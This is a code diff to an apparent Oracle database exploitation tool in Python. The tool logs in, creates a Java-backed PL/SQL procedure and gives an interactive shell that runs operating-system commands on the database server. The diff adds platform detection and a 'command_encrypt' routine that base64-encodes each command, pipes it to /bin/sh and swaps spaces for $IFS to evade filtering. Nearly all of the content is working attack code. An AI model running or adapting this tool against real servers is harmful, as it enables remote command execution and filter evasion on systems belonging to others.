@@ -5,6 +5,7 @@ import cx_Oracle
 import sys
 import signal
 import getopt
+import base64
 
 #log
 def normal(text):
@@ -38,6 +39,12 @@ def getPlatform(cur):
 		cur.execute(query)
 		result = cur.fetchone()
 		normal("OS Platform:%s"%result)
+		if "Linux" in str(result):
+			return "Linux"
+		elif "Windows" in str(result):
+			return "Windows"
+		else:
+			return 0
 	except Exception as e:
 		error(e)
 
@@ -69,7 +76,7 @@ def CreatePLSQL(cur):
 		      }
 		      else {
 		        finalCommand = new String[3];
-		        finalCommand[0] = "/bin/bash";
+		        finalCommand[0] = "/bin/sh";
 		        finalCommand[1] = "-c";
 		        finalCommand[2] = "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/git/bin:/usr/local/sbin:~/bin;export PATH;"+command;
 		      }
@@ -108,7 +115,7 @@ def CreatePLSQL(cur):
 		            br_err = new BufferedReader(new InputStreamReader(pr.getErrorStream()));
 		            String buff = null;
 		            while ((buff = br_err.readLine()) != null) {
-		              System.out.println("Process err :" + buff);
+		              System.out.println(buff);
 		              try {} catch(Exception e) {}
 		            }
 		            br_err.close();
@@ -175,6 +182,15 @@ def CreatePLSQL(cur):
 		error(e)
 		sys.exit()
 
+#command encrypt
+def command_encrypt(platform,cmd):
+	if platform == "Linux":
+		b64cmd = base64.b64encode(cmd.encode('utf-8'))
+		cmd = "echo \"%s\"|base64 -d|/bin/sh"%(str(b64cmd,'utf-8'))
+		cmd = cmd.replace(" ","$IFS")
+		return cmd
+	elif platform == "Windows":
+		return cmd
 #run code
 def rce(cur,cmd):
 	query = """
@@ -252,16 +268,28 @@ normal("Target: %s:%s/%s"%(host,port,sid))
 #login and others
 db = login(user,pwd,host,port,sid)
 cur = db.cursor()
-getPlatform(cur)
+platform = getPlatform(cur)
 signal.signal(signal.SIGINT, quit)
 signal.signal(signal.SIGTERM, quit)
 JAVA_JIT(cur)
 CreatePLSQL(cur)
 executeresult("Execute Command:")
-while True:
-	cmd = input(">>>")
-	if cmd:
-		rce(cur,cmd)
+#Different Platform
+if platform == "Linux":
+	while True:
+		cmd = input(">>>")
+		if cmd:
+			cmd = command_encrypt("Linux",cmd)
+			rce(cur,cmd)
+
+elif platform == "Windows":
+	while True:
+		cmd = input(">>>")
+		if cmd:
+			cmd = command_encrypt("Windows",cmd)
+			rce(cur,cmd)
+
+#Clean
 dropproc(cur)
 print()
 warning("Procedure Dropped")
